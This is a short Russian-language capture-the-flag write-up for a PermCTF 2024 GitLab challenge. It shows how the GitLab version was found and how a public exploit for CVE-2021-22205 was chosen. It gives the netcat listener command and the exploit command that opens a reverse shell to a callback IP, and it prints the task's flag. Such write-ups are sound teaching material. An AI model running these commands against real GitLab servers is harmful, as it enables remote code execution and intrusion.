# Gitlab
## Описание
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/gitlab.jpg)


## Решение 

1. Заходим на сайт, видим страницу логина гитлаба
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/gl_1.png)


2. Попытаемся найти версию гитлаба через /help
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/gl_2.png)

3. версия 13.9, ищем возможный эксплойт для этой версии и находим CVE-2021-22205

4. качаем и открываем шелл
```
netcat -lvvp 9999 # открываем шелл
python CVE-2021-22205.py -u http://localhost:8888 -m rev 192.168.0.104 1234 # эксплуатация уязвимости
```

5. видим в директории файл flag
```
cat flag
```
![Описание задания](https://raw.githubusercontent.com/EogoK/permctf2024_writeup/refs/heads/main/photos/gl_3.png)


## Ресурсы
https://github.com/inspiringz/CVE-2021-22205

## Флаг
PermCTF{980081b41adf8263c5bc46352cb0b41tgds26}